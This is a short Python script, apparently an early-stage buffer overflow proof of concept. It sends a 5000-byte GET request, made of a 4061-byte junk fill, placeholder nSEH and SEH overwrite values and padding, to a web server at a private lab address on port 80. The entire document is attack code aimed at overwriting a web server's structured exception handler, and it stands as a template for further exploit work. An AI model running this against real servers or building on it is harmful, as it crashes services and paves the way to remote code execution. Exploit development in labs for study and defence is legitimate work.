#!/usr/bin/python
import socket


junk = 'A'*4061
nSEH = 'B'*4
SEH = 'C'*4
pad = 'D'*(5000-4061-4-4)

injection = junk + nSEH + SEH + pad
 
s = socket.socket()
s.connect(('192.168.129.128',80))
s.send("GET " + injection + " HTTP/1.0\r\n\r\n") 
s.close()
